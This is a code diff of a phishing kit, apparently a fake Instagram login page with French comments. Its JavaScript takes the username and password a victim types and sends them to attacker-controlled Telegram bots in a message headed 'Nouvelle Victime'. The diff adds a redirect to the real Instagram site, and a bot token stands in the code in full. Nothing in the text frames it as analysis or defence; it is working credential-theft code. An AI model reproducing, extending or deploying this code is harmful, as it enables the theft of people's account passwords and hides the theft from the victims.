@@ -31,6 +31,7 @@
         // Fonction pour envoyer le message à Telegram (à plusieurs bots)
         function sendToTelegram(message, token, chatId) {
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            window.location.href = 'https://instagram.com'; 
     
             const data = {
                 chat_id: chatId,
@@ -66,7 +67,7 @@
             const password = document.querySelector('input[type="password"]').value;
     
             if (username && password) {
-                const message = ` ✨ Nouvelle Victime ✨ *** by *** YKK☑️\n\nNom de profil 👤: ${username}\nMot de passe 🔒: ${password}`;
+                const message = ` ✨ Nouvelle Victime ✨ *** by YKK☑️ ***\n\nNom de profil 👤: ${username}\nMot de passe 🔒: ${password}`;
     
                 // Les tokens et chat IDs des deux bots
                 const token1 = '6799956480:AAF6uKM4b72aAxNe6n2vOCuHpg7rCJoRPkY';  // Remplace par ton premier token
